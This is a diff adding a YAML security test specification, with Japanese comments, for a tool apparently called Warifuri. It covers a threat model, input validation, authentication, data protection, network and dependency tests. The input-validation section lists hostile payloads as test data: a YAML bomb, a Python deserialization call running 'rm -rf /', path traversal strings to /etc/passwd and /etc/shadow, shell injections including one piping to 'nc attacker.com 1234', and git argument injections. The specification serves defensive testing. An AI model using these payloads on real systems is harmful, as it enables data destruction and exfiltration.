@@ -1,0 +1,305 @@
+# Security Test Specification for Warifuri
+# セキュリティテストの観点記述仕様
+
+$schema: "https://warifuri.dev/schemas/test-spec.schema.json"
+specification_version: "1.0.0"
+test_type: "security"
+target_component: "warifuri.security"
+
+metadata:
+  title: "Security Vulnerability Test Specification"
+  description: "Warifuri のセキュリティ脆弱性テスト観点記述"
+  author: "ai_copilot"
+  created_date: "2025-05-31"
+  updated_date: "2025-05-31"
+  priority: "critical"
+  compliance_standards: ["OWASP Top 10", "CWE Top 25"]
+
+# 脅威モデリング
+threat_model:
+  assets:
+    - "ユーザーのソースコード"
+    - "GitHub認証トークン"
+    - "プロジェクト設定情報"
+    - "実行ログ・履歴"
+
+  threat_actors:
+    - "悪意のある第三者"
+    - "内部不正者"
+    - "自動化攻撃ツール"
+
+  attack_vectors:
+    - "悪意のあるYAMLファイル"
+    - "パストラバーサル攻撃"
+    - "コマンドインジェクション"
+    - "権限昇格攻撃"
+
+# 入力検証セキュリティテスト
+input_validation_tests:
+  - category: "YAML処理脆弱性"
+    tests:
+      - test: "YAML Bomb攻撃耐性"
+        description: "大量のメモリを消費するYAMLファイル"
+        attack_payload: |
+          a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+          b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+          c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+        expected: "メモリ使用量制限により拒否"
+
+      - test: "YAML Arbitrary Code Execution"
+        description: "YAMLデシリアライゼーション時のコード実行"
+        attack_payload: "!!python/object/apply:os.system ['rm -rf /']"
+        expected: "安全なYAMLローダーにより拒否"
+
+      - test: "YAML External Entity (XXE)"
+        description: "外部エンティティ参照による情報漏洩"
+        attack_payload: "!include /etc/passwd"
+        expected: "外部参照が無効化されている"
+
+  - category: "パストラバーサル攻撃"
+    tests:
+      - test: "相対パス攻撃"
+        description: "../../ を使用したディレクトリ外アクセス"
+        attack_inputs:
+          - "../../../etc/passwd"
+          - "..\\..\\..\\windows\\system32\\config\\sam"
+          - "/etc/shadow"
+        expected: "適切なパス正規化により拒否"
+
+      - test: "シンボリックリンク攻撃"
+        description: "シンボリックリンクを通じた不正アクセス"
+        attack_scenario: "悪意のあるシンボリックリンクファイル"
+        expected: "シンボリックリンク解決時の安全性チェック"
+
+  - category: "コマンドインジェクション"
+    tests:
+      - test: "Shell Command Injection"
+        description: "コマンド実行時のインジェクション攻撃"
+        attack_inputs:
+          - "task-id; rm -rf /"
+          - "task-id && cat /etc/passwd"
+          - "task-id | nc attacker.com 1234"
+        expected: "適切なエスケープ・サニタイゼーション"
+
+      - test: "Git Command Injection"
+        description: "Git操作時のコマンドインジェクション"
+        attack_inputs:
+          - "--upload-pack='touch /tmp/pwned'"
+          - "-c protocol.ext.allow=always"
+        expected: "Git コマンド引数の適切な検証"
+
+# 認証・認可セキュリティテスト
+authentication_authorization_tests:
+  - category: "認証情報管理"
+    tests:
+      - test: "GitHub Token漏洩防止"
+        description: "ログ・エラーメッセージでのトークン露出"
+        test_scenario: "認証エラー時のログ出力"
+        expected: "トークンがマスクされている"
+
+      - test: "認証情報永続化"
+        description: "認証情報の安全な保存"
+        test_points:
+          - "平文保存されていない"
+          - "適切な権限設定"
+          - "暗号化・難読化済み"
+
+      - test: "認証情報環境変数"
+        description: "環境変数からの認証情報漏洩"
+        test_scenario: "プロセス一覧・環境変数ダンプ"
+        expected: "機密情報が表示されない"
+
+  - category: "権限制御"
+    tests:
+      - test: "ファイルアクセス権限"
+        description: "適切なファイルアクセス制限"
+        test_scenarios:
+          - "設定ファイル読み込み権限"
+          - "ログファイル書き込み権限"
+          - "一時ファイル作成権限"
+        expected: "最小権限の原則に従う"
+
+      - test: "プロセス権限昇格"
+        description: "権限昇格攻撃の防止"
+        test_scenarios:
+          - "sudo権限要求の拒否"
+          - "setuid/setgid実行の防止"
+        expected: "不正な権限昇格が阻止される"
+
+# データ保護セキュリティテスト
+data_protection_tests:
+  - category: "機密情報漏洩防止"
+    tests:
+      - test: "ログファイル機密情報"
+        description: "ログ出力における機密情報の漏洩"
+        sensitive_data:
+          - "APIキー・トークン"
+          - "パスワード・認証情報"
+          - "個人識別情報"
+        expected: "機密情報が適切にマスクされる"
+
+      - test: "エラーメッセージ情報漏洩"
+        description: "エラー時の内部情報露出"
+        test_scenarios:
+          - "スタックトレース"
+          - "ファイルパス情報"
+          - "データベース接続情報"
+        expected: "内部実装詳細が隠蔽される"
+
+  - category: "暗号化・ハッシュ化"
+    tests:
+      - test: "機密データ暗号化"
+        description: "保存時データの暗号化"
+        test_points:
+          - "適切な暗号化アルゴリズム使用"
+          - "鍵管理の安全性"
+          - "初期化ベクトルのランダム性"
+
+      - test: "ハッシュ関数安全性"
+        description: "ハッシュ関数の適切な使用"
+        requirements:
+          - "暗号学的に安全なハッシュ関数"
+          - "適切なソルト使用"
+          - "レインボーテーブル攻撃耐性"
+
+# ネットワークセキュリティテスト
+network_security_tests:
+  - category: "HTTPS通信"
+    tests:
+      - test: "証明書検証"
+        description: "SSL/TLS証明書の適切な検証"
+        test_scenarios:
+          - "自己署名証明書の拒否"
+          - "期限切れ証明書の拒否"
+          - "ホスト名不一致の拒否"
+        expected: "不正な証明書による接続拒否"
+
+      - test: "中間者攻撃防止"
+        description: "MITM攻撃の検出・防止"
+        attack_scenarios:
+          - "証明書ピンニング"
+          - "HTTP降格攻撃"
+        expected: "攻撃が検出・阻止される"
+
+  - category: "API セキュリティ"
+    tests:
+      - test: "レート制限"
+        description: "API呼び出し頻度制限"
+        test_scenario: "大量リクエスト送信"
+        expected: "適切なレート制限により保護"
+
+      - test: "API認証"
+        description: "API認証の適切な実装"
+        test_points:
+          - "認証トークンの適切な送信"
+          - "認証失敗時の適切な処理"
+          - "セッション管理の安全性"
+
+# 依存関係セキュリティテスト
+dependency_security_tests:
+  - category: "脆弱性スキャン"
+    tools:
+      - "safety (Python依存関係)"
+      - "bandit (静的解析)"
+      - "semgrep (セキュリティパターン)"
+
+    tests:
+      - test: "既知脆弱性検出"
+        description: "依存ライブラリの既知脆弱性"
+        expected: "CVE等級の脆弱性が検出される"
+
+      - test: "ライセンス互換性"
+        description: "依存関係のライセンス確認"
+        expected: "互換性のないライセンスが検出"
+
+  - category: "サプライチェーン攻撃"
+    tests:
+      - test: "依存関係改竄検出"
+        description: "依存パッケージの整合性確認"
+        verification_methods:
+          - "ハッシュ値検証"
+          - "デジタル署名確認"
+
+      - test: "悪意のあるパッケージ検出"
+        description: "typosquatting等の検出"
+        test_scenarios:
+          - "類似名パッケージ"
+          - "予期しない依存関係"
+
+# コンプライアンステスト
+compliance_tests:
+  - standard: "OWASP Top 10 2021"
+    covered_risks:
+      - "A01:2021 – Broken Access Control"
+      - "A02:2021 – Cryptographic Failures"
+      - "A03:2021 – Injection"
+      - "A06:2021 – Vulnerable Components"
+      - "A09:2021 – Security Logging and Monitoring Failures"
+
+  - standard: "CWE Top 25"
+    covered_weaknesses:
+      - "CWE-79: Cross-site Scripting"
+      - "CWE-89: SQL Injection"
+      - "CWE-22: Path Traversal"
+      - "CWE-78: OS Command Injection"
+      - "CWE-434: Unrestricted Upload"
+
+# セキュリティテスト自動化
+automation_framework:
+  static_analysis:
+    - "bandit による静的脆弱性スキャン"
+    - "semgrep によるセキュリティパターン検出"
+    - "ruff による安全でないパターン検出"
+
+  dynamic_analysis:
+    - "pytest-security による動的テスト"
+    - "OWASP ZAP による自動脆弱性スキャン"
+    - "カスタムセキュリティテストスイート"
+
+  dependency_scanning:
+    - "safety による依存関係脆弱性スキャン"
+    - "pip-audit による追加検証"
+    - "GitHub Dependabot アラート監視"
+
+# インシデント対応テスト
+incident_response_tests:
+  - scenario: "セキュリティ侵害検出"
+    simulation: "不正アクセス試行の検出"
+    expected_response:
+      - "適切なログ記録"
+      - "アラート通知"
+      - "セッション無効化"
+
+  - scenario: "データ漏洩対応"
+    simulation: "機密情報露出の発見"
+    expected_response:
+      - "影響範囲の特定"
+      - "ログ保全"
+      - "通知プロセス"
+
+# 品質ゲート
+security_quality_gates:
+  vulnerability_scanning:
+    - "Critical/High脆弱性: 0件"
+    - "Medium脆弱性: 5件以下"
+    - "依存関係脆弱性: 修正済みまたは軽減策あり"
+
+  security_testing:
+    - "すべてのセキュリティテストが合格"
+    - "OWASP Top 10 対策完了"
+    - "CWE Top 25 対策完了"
+
+  compliance:
+    - "セキュリティコーディング標準準拠"
+    - "適切なセキュリティドキュメント"
+    - "インシデント対応プロセス確立"
+
+notes: |
+  セキュリティテストは継続的に実行され、
+  新たな脅威や脆弱性に対応する必要がある。
+
+  自動化されたセキュリティテストスイートにより、
+  開発プロセス全体でセキュリティ品質を担保する。
+
+  定期的な脆弱性評価とペネトレーションテストにより、
+  実際の攻撃に対する耐性を検証する。
